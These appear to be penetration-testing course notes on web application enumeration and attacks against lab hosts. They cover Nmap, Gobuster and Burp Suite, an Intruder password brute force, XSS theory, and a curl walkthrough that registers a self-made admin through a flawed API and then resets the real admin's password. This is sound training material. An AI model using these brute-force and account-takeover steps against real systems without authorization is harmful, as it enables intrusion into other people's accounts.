# Introduction to Web Application Attacks
Modern development frameworks and hosting solutions have simplified the process of building and deploying web-based applications
+ However, these applications usually expose a large attack surface due to multiple dependencies, insecure server configurations, a lack of mature application code, and business-specific application flaws

Web applications are written using a variety of programming languages and frameworks, each of which can introduce specific types of vulnerabilities
+ Since the most common vulnerabilities are alike in concept and the various frameworks behave similarly regardless of the underlying technology stack, we'll be able to follow similar exploitation avenues

## Web Application Assessment Methodology 
As a penetration tester, we can assess a web application using three different methods, depending on the kind of information we have been provided, the scope, and the particular engagement rules
+ _White-box_ testing describes scenarios in which we have unconstrained access to the application's source code, the infrastructure it resides on, and its design documentation. 
	+ Because this type of testing gives us a more comprehensive view of the application, it requires a specific skill set to find vulnerabilities in source code
	+ The skills required for white-box testing include source code and application logic review, among others
	+ This testing methodology might take a longer time, relative to the size of the code base being reviewed
+ _Black-box_ testing (also known as a _zero-knowledge_ test) provides no information about the target application, meaning it's essential for the tester to invest significant resources into the enumeration stage
	+ This is the approach taken during most bug bounty engagements
+ *Grey-box* testing occurs whenever we are provided with limited information on the target's scope, including authentication methods, credentials, or details about the framework

Will explore web application vulnerability enumeration and exploitation
+ Although the complexity of vulnerabilities and attacks varies, we'll demonstrate exploiting several common web application vulnerabilities in the OWASP Top 10 list

The OWASP Foundation aims to improve global software security and, as part of this goal, they develop the OWASP Top 10, a periodically-compiled list of the most critical security risks to web applications
+ Understanding these attack vectors will serve as the basic building blocks to construct more advanced attacks, as we'll learn in other Modules

## Web Application Assessment Tools 

### Fingerprinting Web Servers with Nmap
Nmap is the go-to tool for initial active enumeration
+ Should start web application enumeration from its core component, the web server, since this is the common denominator of any web application that exposes its services

A web server can be discovered usually by port 80, can do version enumeration on it with the following:
```
sudo nmap -p80  -sV <IP>
```
+ Can take enumeration further, with service specific Nmap NSE scripts, like `http-enum`, which performs an initial fingerprinting of the web server:
+ Usage: `sudo nmap -p80 --script=http-enum <IP>`
	+ Example output:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-29 06:30 EDT
Nmap scan report for 192.168.50.20
Host is up (0.10s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /login.php: Possible admin folder
|   /db/: BlogWorx Database
|   /css/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /db/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /images/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|   /js/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'
|_  /uploads/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'

Nmap done: 1 IP address (1 host up) scanned in 16.82 seconds
```
+ As shown above, we discovered several interesting folders that could lead to further details about the target web application

### Technology Stack Identification with Wappalyzer
Can passively fetch a wealth of information about the application technology stack via _Wappalyzer_
+ Can perform a Technology Lookup on a domain, or use the Firefox extension
+ From a quick third-party external analysis, can learn about the OS, the UI framework, the web server, and more
	+ The findings also provide information about JavaScript libraries used by the web application - this can be valuable data, as some versions of JavaScript libraries are known to be affected by several vulnerabilities

### Directory Brute Force with Gobuster
Once we have discovered an application running on a web server, our next step is to map all its publicly-accessible files and directories
+ To do this, will need to perform multiple queries against the target to discover any hidden paths 
+ <mark style="background: #D2B3FFA6;">Gobuster</mark> is a tool written in Go, that does that sort of enumeration
	+ It will uses wordlists to discover directories and files on a server through brute forcing 
	+ **Note**: Due to its brute forcing nature, Gobuster can generate quite a lot of traffic, meaning it will not be helpful when staying under the radar is necessary
	+ <mark style="background: #D2B3FFA6;">wget</mark> is helpful to download files that are found with Gobuster 

Gobuster supports different enumeration modes, including fuzzing and dns, but for now, we'll only rely on the **dir** mode, which enumerates files and directories
+ We need to specify the target IP using the `-u` parameter and a wordlist with `-w`
+ The default running threads are 10; we can reduce the amount of traffic by setting a lower number via the `-t` parameter
+ A good wordlist can be found under `/usr/share/wordlists/dirb/`, for example: `common.txt`
+ Usage example: `gobuster dir -u 192.168.50.20 -w /usr/share/wordlists/dirb/common.txt -t 5`
	+ Example output:
```
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.20
[+] Method:                  GET
[+] Threads:                 5
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/30 05:16:21 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/css                  (Status: 301) [Size: 312] [--> http://192.168.50.20/css/]
/db                   (Status: 301) [Size: 311] [--> http://192.168.50.20/db/]
/images               (Status: 301) [Size: 315] [--> http://192.168.50.20/images/]
/index.php            (Status: 302) [Size: 0] [--> ./login.php]
/js                   (Status: 301) [Size: 311] [--> http://192.168.50.20/js/]
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://192.168.50.20/uploads/]

===============================================================
2022/03/30 05:18:08 Finished
===============================================================
```

### Security Testing with Burp Suite
_Burp Suite_ is a GUI-based integrated platform for web application security testing. 
+ It provides several different tools via the same user interface
+ Can find Burp Suite Community Edition in Kali under _Applications_ > _03 Web Application Analysis_ > _burpsuite_, or launch it from the CLI via the `burpsuite` command

While the free Community Edition mainly contains tools used for manual testing, the commercial versions include additional features, including a formidable web application vulnerability scanner

Staring Burp is as follows:
+ Once it launches, we'll choose _Temporary project_ and click _Next_
+ Once it launches, we'll choose _Temporary project_ and click _Next_
+ After a few moments, the UI will load:
![[Pasted image 20230809215448.png]]
+ We are going to focus on the features present on the tabs in the upper bar

#### Proxy
The _Proxy_ tool. In general terms, a web proxy is any dedicated hardware or software meant to intercept requests and/or responses between the web client and the web server
+ This allows administrators and testers alike to modify any requests that are intercepted by the proxy, both manually and automatically
+ Some web proxies are employed to intercept company-wide TLS traffic. Known as TLS inspection devices, these perform decryption and re-encryption of the traffic and thus nullify any privacy layer provided by the HTTPS protocol

With the Burp Proxy tool, we can intercept any request sent from the browser before it is passed on to the server
+ We can change almost anything about the request at this point, such as parameter names or form values
+ We can even add new headers
+ This lets us test how an application handles unexpected arbitrary input
+ For example, an input field might have a size limit of 20 characters, but we could use Burp Suite to modify a request to submit 30 characters

In order to set up a proxy, we will first click the _Proxy_ tab to reveal several sub-tabs. We'll also disable the _Intercept_ tool, found under the _Intercept_ tab
+ **Note**: When _Intercept_ is enabled, we have to manually click on _Forward_ to send each request to its destination. Alternatively, we can click _Drop_ to _not_ send the request. There are times when we will want to intercept traffic and modify it, but when we are just browsing a site, having to click _Forward_ on each request is very tedious:
![[Pasted image 20230809215801.png]]

Next, we can review the proxy listener settings. The _Options_ sub-tab shows what ports are listening for proxy requests:
![[Pasted image 20230809215831.png]]
+ By default, Burp Suite enables a proxy listener on **localhost:8080**
+ This is the host and port that our browser must connect to in order to proxy traffic through Burp Suite

How to configure our local Kali machine with the Firefox browser to use Burp Suite as a proxy:
+ In Firefox, we can do this by navigating to **`about:preferences#general`**, scrolling down to _Network Settings_, then clicking _Settings_
+ Choose the _Manual_ option, setting the appropriate IP address and listening port
	+ In our case, the proxy (Burp) and the browser reside on the same host, so we'll use the loopback IP address 127.0.0.1 and specify port 8080
	+ In some testing scenarios, we might want to capture the traffic from multiple machines, so the proxy will be configured on a standalone IP. In such cases, we will configure the browser with the external IP address of the proxy
+ Finally, we also want to enable this proxy server for all protocol options to ensure that we can intercept every request while testing the target application
+ <mark style="background: #FFF3A3A6;">Alternatively</mark>: Can use foxy proxy extension for easy switching

We should now find the intercepted traffic in Burp Suite under _Proxy_ > _HTTP History_ 
![[Pasted image 20230809220142.png]]
+ Can now review the various requests our browser performed towards our target website
+ By clicking on one of the requests, the entire dump of client requests and server responses is shown in the lower half of the Burp UI:
![[Pasted image 20230809220203.png]]
+ On the left pane we can visualize the client request details, with the server response on the right pane
+ With this powerful Burp feature, we can inspect every detail of each request performed, along with the response

Why does "detectportal.firefox.com" keep showing up in the proxy history? A _captive portal_ is a web page that serves as a sort of gateway page when attempting to browse the Internet. It is often displayed when accepting a user agreement or authenticating through a browser to a Wi-Fi network. To ignore this, simply enter **`about:config`** in the address bar. Firefox will present a warning, but we can proceed by clicking _I accept the risk!_. Finally, search for "network.captive-portal-service.enabled" and double-click it to change the value to "false". This will prevent these messages from appearing in the proxy history.

#### Repeater 
With the *Repeater*, we can craft new requests or easily modify the ones in History, resend them, and review the responses
+ To observe this in action, we can right-click a request from _Proxy_ > _HTTP History_ and select _Send to Repeater_:
![[Pasted image 20230809220410.png]]

If we click on _Repeater_, we will observe one sub-tab with the request on the left side of the window
+ We can send multiple requests to Repeater and it will display them using separate tabs
+ Can send the request to the server by clicking _Send_
+ Burp Suite will display the raw server response on the right side of the window, which includes the response headers and un-rendered response content:
![[Pasted image 20230809220517.png]]

#### Intruder
The _Intruder_ Burp feature, as its name suggests, is designed to automate a variety of attack angles, from the simplest to more complex web application attacks
+ Will often need to update the `/etc/hosts` with the IP and domain mapping 
+ To learn more about this feature, let's simulate a password brute forcing attack

Will grab a request from *proxy* or *repeater*, and send it to *Intruder* 
+ For example: Navigate to _Proxy_ > _HTTP History_, right-click on the POST request to **/wp-login.php** and select _Send to Intruder_:
![[Pasted image 20230809220819.png]]

We can now select the _Intruder_ tab in the upper bar, choose the POST request we want to modify, and move to the _Positions_ sub-tab
+ Knowing that the user _admin_ is correct, we only need to brute force the password field
+ First, we'll press _Clear_ on the right bar so that all fields are cleared
+ We can then select the value of the _pwd_ key and press the _Add_ button on the right:
![[Pasted image 20230809220911.png]]

We have now instructed the Intruder to modify only the password value on each new request
+ Before starting our attack, let's provide Intruder with a wordlist
+ Knowing that the correct password is "password", we can grab the first 10 values from the **rockyou** wordlist on Kali:
```
kali@kali:~$ cat /usr/share/wordlists/rockyou.txt | head
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
12345678
abc123
```

Moving to the _Payloads_ sub-tab, we can paste the above wordlist into the _Payload Options[Simple list]_ area:
![[Pasted image 20230809221012.png]]

With everything ready to start the Intruder attack, let's click on the top right _Start Attack_ button
+ We can move past the Burp warning about restricted Intruder features, as this won't impact our attack
+ After we let the attack complete, we can observe that apart from the initial probing request, it performed 10 requests, one for each entry in the provided wordlist:
![[Pasted image 20230809221043.png]]
+ We'll notice that the WordPress application replied with a different _Status_ code on the 4th request, hinting that this might be the correct password value
+ Our hypothesis is confirmed once we try to log in to the WordPress administrative console with the discovered password

## Web Application Enumeration
In a previous Module, we learned how passive information gathering can play a critical role when mapping web applications, especially when public repositories or Google dorks disclose sensitive information about our target
+ Whether working with leaked credentials or mere application documentation, we should always refer to the information retrieved passively during our active web application testing, as it might lead to unexplored paths

It is important to identify the components that make up a web application before attempting to blindly exploit it 
+ Many web application vulnerabilities are technology-agnostic
+ However, some exploits and payloads need to be crafted based on the technological underpinnings of the application, such as the database software or operating system
+ Before launching any attacks on a web application, we should first attempt to discover the technology stack in use
+ Technology stacks generally consist of a host operating system, web server software, database software, and a frontend/backend programming language
+ Once we have enumerated the underlying stack using the methodologies we learned earlier, we'll move on to application enumeration

We can leverage several techniques to gather this information directly from the browser. Most modern browsers include developer tools that can assist in the enumeration process
+ As the name implies, although Developer Tools are typically used by developers, they are useful for our purposes because they offer information about the inner workings of our target application

### Debugging Page Content 
A good place to start our web application information mapping is with a *URL address*
+ File extensions, which are sometimes part of a URL, can reveal the programming language the application was written in
+ Some extensions, like **.php**, are straightforward, but others are more cryptic and vary based on the frameworks in use
	+ For example, a Java-based web application might use **.jsp**, **.do**, or **.html**

File extensions on web pages are becoming less common, however, since many languages and frameworks now support the concept of _routes_
+ This allows developers to map a URI to a section of code 
+ Applications leveraging routes use logic to determine what content is returned to the user, making URI extensions largely irrelevant

Although URL inspection can provide some clues about the target web application, most context clues can be found in the *source of the web page*
+ The Firefox _Debugger_ tool (found in the _Web Developer_ menu) displays the page's resources and content, which varies by application
+ The Debugger tool may display JavaScript frameworks, hidden input fields, comments, client-side controls within HTML, JavaScript, and much more

For example, can open the debugger while browsing the *offsecwp* app:
![[Pasted image 20230810153201.png]]
+ We'll notice that the application uses _jQuery_ version 3.6.0, a common JavaScript library
+ In this case, the developer _minified_ the code, making it more compact and conserving resources, which also makes it somewhat difficult to read
+ Fortunately, we can "prettify" code within Firefox by clicking on the _Pretty print source_ button with the double curly braces:
![[Pasted image 20230810153322.png]]

After clicking the icon, Firefox will display the code in a format that is easier to read and follow:
![[Pasted image 20230810153338.png]]

Can also use the _Inspector_ tool to drill down into specific page content:
+ Will use the Inspector to examine the _search input_ element from the WordPress home page by scrolling, right-clicking the search field on the page, and selecting _Inspect_:
![[Pasted image 20230810153438.png]]

This will open the Inspector tool and highlight the HTML for the element we right-clicked on:
![[Pasted image 20230810153508.png]]
+ This tool can be especially useful for quickly finding hidden form fields in the HTML source

### Inspect HTTP Response Headers and Sitemaps 
We can also search server responses for additional information, There are two types of tools we can use to accomplish this task:
+  A *proxy*, like *Burp Suite*, which intercepts requests and responses between a client and a web server
+ The browser's own _Network_ tool

Will begin by demonstrating the _Network_ tool:
+ Can launch it from the Firefox _Web Developer_ menu to review HTTP requests and responses
+ This tool shows network activity that occurs after it launches, so we must refresh the page to display traffic:
![[Pasted image 20230810153939.png]]
+ Can click on a request to get more details about it:
	+ In this case, we want to inspect response headers
	+ Response headers are a subset of _HTTP headers_ that are sent in response to an HTTP request:
![[Pasted image 20230810154122.png]]

The _Server_ header displayed above will often reveal at least the name of the web server software
+ In many default configurations, it also reveals the version number
+ HTTP headers are not always generated solely by the web server, For instance, web proxies actively insert the _X-Forwarded-For_ header to signal the web server about the original client IP address
+ Historically, headers that started with "X-" were called non-standard HTTP headers. However, RFC6648 now deprecates the use of "X-" in favor of a clearer naming convention

The names or values in the response header often reveal additional information about the technology stack used by the application
+ Some examples of non-standard headers include _X-Powered-By_, _x-amz-cf-id_, and _X-Aspnet-Version_
+ Further research into these names could reveal additional information, such as that the "*x-amz-cf-id*" header indicates the application uses Amazon CloudFront

_Sitemaps_ are another important element we should take into consideration when enumerating web applications
+ Web applications can include sitemap files to help search engine bots crawl and index their sites
+ These files also include directives of which URLs _not_ to crawl - typically sensitive pages or administrative consoles, which are exactly the sort of pages we are interested in
+ Inclusive directives are performed with the _sitemaps_ protocol, while **robots.txt** excludes URLs from being crawled
+ Additionally, another common sitemap locations is **sitemap.xml**: `http://<IP>/sitemap.xml`
+ For example, we can retrieve the **robots.txt** file from `www.google.com` with **curl**: `curl https://www.google.com/robots.txt`
	+ Example output:
```
User-agent: *
Disallow: /search
Allow: /search/about
Allow: /search/static
Allow: /search/howsearchworks
Disallow: /sdch
Disallow: /groups
Disallow: /index.html?
Disallow: /?
Allow: /?hl=
...
```
+ _Allow_ and _Disallow_ are directives for web crawlers indicating pages or directories that "polite" web crawlers may or may not access, respectively
+ In most cases, the listed pages and directories may not be interesting, and some may even be invalid
+ Nevertheless, sitemap files should not be overlooked because they may contain clues about the website layout or other interesting information, such as yet-unexplored portions of the target

### Enumerating and Abusing APIs
In many cases, our penetration test target is an internally-built, closed-source web application that is shipped with a number of _Application Programming Interfaces_ (API)
+ These APIs are responsible for interacting with the back-end logic and providing a solid backbone of functions to the web application
+ A specific type of API named _Representational State Transfer_ (REST) is used for a variety of purposes, including authentications

In a typical white-box test scenario, we would receive complete API documentation to help us fully map the attack surface
+ However, when performing a *black-box* test, we'll need to *discover the target's API ourselves*

We can use <mark style="background: #D2B3FFA6;">Gobuster</mark> features to brute force the API endpoints
+ In this test scenario, our API gateway web server is listening on port 5001 on 192.168.50.16, so we can attempt a directory brute force attack
+ *API paths* are often followed by a version number, resulting in a pattern such as: 
```
/api_name/v1
```

The API name is often quite descriptive about the feature or data it uses to operate, followed directly by the version number
+ With this information, let's try brute forcing the API paths using a wordlist along with the _pattern_ Gobuster feature
+ We can call this feature by using the **-p** option and providing a file with patterns
+ For our test, we'll create a simple pattern file on our Kali system containing the following text:
```
{GOBUSTER}/v1
{GOBUSTER}/v2
```

In this example, we are using the "{GOBUSTER}" placeholder to match any word from our wordlist, which will be appended with the version number
+  keep our test simple, we'll try with only two versions

We are now ready to enumerate the API with **gobuster** using the following command:
+ Usage: `gobuster dir -u http://<IP/DOMAIN>:<PORT> -w /usr/share/wordlists/dirb/<WORDLIST_TXT> -p <PATERN_FILE>`
+ Example usage and output:
```
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.16:5001
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Patterns:                pattern (1 entries)
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/06 04:19:46 Starting gobuster in directory enumeration mode
===============================================================
/books/v1             (Status: 200) [Size: 235]
/console              (Status: 200) [Size: 1985]
/ui                   (Status: 308) [Size: 265] [--> http://192.168.50.16:5001/ui/]
/users/v1             (Status: 200) [Size: 241]
```

We discovered multiple hits, including two interesting entries that seem to be API endpoints, _/books/v1_ and _/users/v1_.
+ **Note**: If we browse to the **/ui** path we'll discover the entire APIs' documentation. Although this is common during white-box testing, is not a luxury we normally have during a black-box test.

Let's first inspect the **/users** API with **curl**:
```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 241
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 09:27:50 GMT

{
  "users": [
    {
      "email": "mail1@mail.com",
      "username": "name1"
    },
    {
      "email": "mail2@mail.com",
      "username": "name2"
    },
    {
      "email": "admin@mail.com",
      "username": "admin"
    }
  ]
}
```
+ The application returned three user accounts, including an administrative account that seems to be worth further investigation
+ We can use this information to attempt another brute force attack with **gobuster**, this time targeting the _admin_ user with a smaller wordlist
+ To verify if any further API property is related to the _username_ property, we'll expand the API path by inserting the admin username at the very end:
```
kali@kali:~$ gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.50.16:5001/users/v1/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/small.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/06 06:40:12 Starting gobuster in directory enumeration mode
===============================================================
/email                (Status: 405) [Size: 142]
/password             (Status: 405) [Size: 142]

===============================================================
2022/04/06 06:40:35 Finished
===============================================================
```

The **password** API path seems enticing for our testing purposes, so we'll probe it via **curl**:
```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/admin/password
HTTP/1.0 405 METHOD NOT ALLOWED
Content-Type: application/problem+json
Content-Length: 142
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 10:58:51 GMT

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
}
```
Interestingly, instead of a _404 Not Found_ response code, we received a _405 METHOD NOT ALLOWED_, implying that the requested URL is present, but that our HTTP method is unsupported
+ By default, curl uses the GET method when it performs requests, so we could try interacting with the **password** API through a different method, such as *POST* or *PUT*
+ Both POST and PUT methods, if permitted on this specific API, could allow us to override the user credentials (in this case, the administrator password)

Before attempting a different method, let's verify whether or not the overwritten credentials are accepted. We can check if the _login_ method is supported by extending our base URL as follows:

```
kali@kali:~$ curl -i http://192.168.50.16:5002/users/v1/login
HTTP/1.0 404 NOT FOUND
Content-Type: application/json
Content-Length: 48
Server: Werkzeug/1.0.1 Python/3.7.13
Date: Wed, 06 Apr 2022 12:04:30 GMT

{ "status": "fail", "message": "User not found"}
```
+ Although we were presented with a _404 NOT FOUND_ message, the status message states that the user has not been found; another clear sign that the API itself exists. We only need to find a proper way to interact with it 
+ We know one of the usernames is _admin_, so we can attempt a login with this username and a dummy password to verify that our strategy makes sense

Next, we will try to convert the above GET request into a POST and provide our payload in the required JSON format
+ Craft our request by first passing the admin username and dummy password as JSON data via the **-d** parameter
+ We'll also specify "json" as the "Content-Type" by specifying a new header with **-H**
+ Usage: `curl -d <JSON_STRING> -H <HEADER_STRING> <URL>
	+ Example usage and output:
```
kali@kali:~$ curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{ "status": "fail", "message": "Password is not correct for the given username."}
```

The API return message shows that the authentication failed, meaning that the API parameters are correctly formed
+ Since we don't know admin's password, let's try another route and check whether we can register as a new user. This might lead to a different attack surface
+ Let's try registering a new user with the following syntax by adding a JSON data structure that specifies the desired username and password:
```
kali@kali:~$curl -d '{"password":"lab","username":"offsecadmin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/register

{ "status": "fail", "message": "'email' is a required property"}
```

The API replied with a fail message stating that we should also include an email address
+ We could take this opportunity to determine if there's any administrative key we can abuse. Let's add the _admin_ key, followed by a _True_ value:
```
kali@kali:~$curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register
{"message": "Successfully registered. Login to receive an auth token.", "status": "success"}
```

Since we received no error, it seems we were able to successfully register a new user as an admin, which should not be permitted by design
+ Next, let's try to log in with the credentials we just created by invoking the **login** API we discovered earlier:
```
kali@kali:~$curl -d '{"password":"lab","username":"offsec"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew", "message": "Successfully logged in.", "status": "success"}
```
+ We were able to correctly sign in and retrieve a JWT authentication token
	+ To obtain tangible proof that we are an *administrative user*, we should use this token to change the admin user password.

We can attempt this by forging a POST request that targets the **password** API:
```
kali@kali:~$ curl  \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' \
  -d '{"password": "pwned"}'

{
  "detail": "The method is not allowed for the requested URL.",
  "status": 405,
  "title": "Method Not Allowed",
  "type": "about:blank"
```
+ We passed the JWT key inside the _Authorization_ header along with the new password

Sadly, the application states that the method used is incorrect, so we need to try another one:
+ The PUT method (along with PATCH) is often used to replace a value as opposed to creating one via a POST request, so let's try to explicitly define it next:
```
kali@kali:~$ curl -X 'PUT' \
  'http://192.168.50.16:5002/users/v1/admin/password' \
  -H 'Content-Type: application/json' \
  -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' \
  -d '{"password": "pwned"}'
```
+ This time we received no error message, so we can assume that no error was thrown by the application backend logic
+ To prove that our attack succeeded, we can try logging in as admin using the newly-changed password:
```
kali@kali:~$ curl -d '{"password":"pwned","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login
{"auth_token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzIxMjgsImlhdCI6MTY0OTI3MTgyOCwic3ViIjoiYWRtaW4ifQ.yNgxeIUH0XLElK95TCU88lQSLP6lCl7usZYoZDlUlo0", "message": "Successfully logged in.", "status": "success"}
```

We managed to take over the admin account by exploiting a logical privilege escalation bug present in the registration API
+ These kind of programming mistakes happen to various degrees when building web applications that rely on custom APIs, often due to lack of testing and secure coding best practices
+ So far we have relied on curl to manually assess the target's API so that we could get a better sense of the entire traffic flow

This approach, however, will not properly scale whenever the number of APIs becomes significant. Luckily, we can recreate all the above steps from within **Burp**:
+ As an example, let's replicate the latest admin login attempt and send it to the proxy by appending the _--proxy 127.0.0.1:8080_ to the command
+ Once done, from Burp's _Repeater_ tab, we can create a new empty request and fill it with the same data as we did previously:
![[Pasted image 20230810162435.png]]
+ Then we'll click on the _Send_ button and verify the incoming response on the right pane:
![[Pasted image 20230810162502.png]]

Great! We were able to recreate the same behavior within our proxy, which, among other advantages, enables us to store any tested APIs in its database for later investigation
+ Once we've tested a number of different APIs, we could navigate to the _Target_ tab and then _Site map_. We can then retrieve the entire map of the paths we have been testing so far:
![[Pasted image 20230810162525.png]]
+ From Burp's Site map, we can track the API we discovered and forward any saved request to the Repeater or Intruder for further testing

#### Bash One-liners 
A helpful way to get a list of numbers for enumeration:
+ `seq 1 100 > numbers.txt`, where `seq <NUM_START> <NUM_END>` will make that range of numbers, and can then send that to a file 
+ **Escaping Newlines**: You can use a backslash to escape the newline character and continue a command on the next line. For example 
``` bash
echo "This is a long \ 
line of text."
```

## Cross-Site Scripting 
One of the most important features of a well-defended web application is *data sanitization* 
+ This is the process in which user input is processed so that all dangerous characters or strings are removed or transformed 
+ Un-sanitized data allows an attacker to inject, and potentially execute, malicious code 

*Cross-Site Scripting* (**XSS**) is a vulnerability that exploits a user's trust in a website by dynamically injecting content into the page rendered by the user's browser
+ Once thought to be a low-risk vulnerability, XSS today is both high-risk and prevalent, allowing attackers to inject client-side scripts, such as JavaScript, into web pages visited by other users 

### Stored vs Reflected XSS Theory
XSS vulnerabilities can be grouped into two major classes: _stored_ or _reflected_
+ _Stored XSS attacks_, also known as _Persistent XSS_, occur when the exploit payload is stored in a database or otherwise cached by a server
	+ The web application then retrieves this payload and displays it to anyone who visits a vulnerable page
	+ A single Stored XSS vulnerability can therefore attack all site users
	+ Stored XSS vulnerabilities often exist in forum software, especially in comment sections, in product reviews, or wherever user content can be stored and reviewed later
+ _Reflected XSS attacks_ usually include the payload in a crafted request or link
	+ The web application takes this value and places it into the page content
	+ This XSS variant only attacks the person submitting the request or visiting the link
	+ Reflected XSS vulnerabilities can often occur in search fields and results, as well as anywhere user input is included in error messages
+ Either of these two vulnerability variants can manifest as client- (browser) or server-side; they can also be _DOM-based_

All XSS will have a **source** and a **sink**:
+ **Source:** The source of an XSS attack is the point in the application where user input or untrusted data is introduced into the web page's content or code. This is typically where the attacker manages to inject the malicious script. Sources can include user input fields, URL parameters, cookies, and more. For instance, if an application allows users to submit comments on a blog post, and the comments are not properly sanitized, an attacker might use the comment input as a source to inject malicious scripts.
+ **Sink:** The sink is the point in the application where the untrusted data (in this case, the malicious script) is used or executed by the browser. This could be places such as HTML elements, JavaScript functions, or even in response headers. Sinks are where the vulnerability manifests, as the malicious script gets executed in the context of other users' browsers, potentially compromising their session or stealing their data.

_DOM-based XSS_ takes place solely within the page's _Document Object Model_ (DOM)
+ Should know that browsers parse a page's HTML content and then generate an internal DOM representation
+ This type of XSS occurs when a page's DOM is modified with user-controlled values
+ DOM-based XSS can be stored or reflected; the key is that DOM-based XSS attacks occur when a browser parses the page's content and inserted JavaScript is executed
+ For example, a `#` takes you to a different part of the page, but does not get a new page, meaning it does not hit the server 
	+ There will often be a be a javascript tag on the page or referenced on the page, that based on some user input, in this case whats after `#` in the url, it will change some aspect of the HTML page, without interacting with the server 
	+ Will be updating some variable in the browser DOM function, for example `window.location.hash`
	+ If the **source** and the **sink** of the XSS occur entirely within the DOM within a single application on a single page, it is categorized as a DOM based XSS

No matter how the XSS payload is delivered and executed, the injected scripts run under the context of the user visiting the affected page
+ This means that the user's browser, not the web application, executes the XSS payload
+ These attacks can be nevertheless significant, with impacts including session hijacking, forced redirection to malicious pages, execution of local applications as that user, or even trojanized web applications

### JavaScript Refresher
JavaScript is a high-level programming language that has become one of the main components of modern web applications
+ All modern browsers include a JavaScript engine that runs JavaScript code from within the browser itself

When a browser processes a server's HTTP response containing HTML, the browser creates a DOM tree and renders it 
+ The DOM is comprised of all forms, inputs, images, etc. related to the web page

JavaScript's role is to access and modify the page's DOM, resulting in a more interactive user experience
+ From an attacker's perspective, this also means that if we can inject JavaScript code into the application, we can access and modify the page's DOM
+ With access to the DOM, we can redirect login forms, extract passwords, and steal session cookies

Like many other programming languages, JavaScript can combine a set of instructions into a function:
```
function multiplyValues(x,y) {
  return x * y;
}
 
let a = multiplyValues(3, 5)
console.log(a)
```
+ We declared a function named _multiplyValues_ on lines 1-3 that accepts two integer values as parameters and returns their product
+ On line 5, we invoke _multiplyValues_ by passing two integer values, 3 and 5, as parameters, and assigning the variable _a_ to the value returned by the function
+ As a last step, on line 6 we print the value of _a_ to the console

When declaring the _a_ variable, we don't assign just any type to the variable, since JavaScript is a _loosely typed_ language
+ This means that the actual type of the _a_ variable is inferred as a Number type based on the type of the invoked function arguments, which are Number types

We can verify the above code by opening the developer tools in Firefox on the `about:blank` page to avoid clutter originated by any extra loaded library
+ In web browsers like Firefox, `about:blank` is a special URL that represents an empty or blank page
	+ When you enter `about:blank` into the address bar of your browser and navigate to it, the browser will display a completely empty page with no content
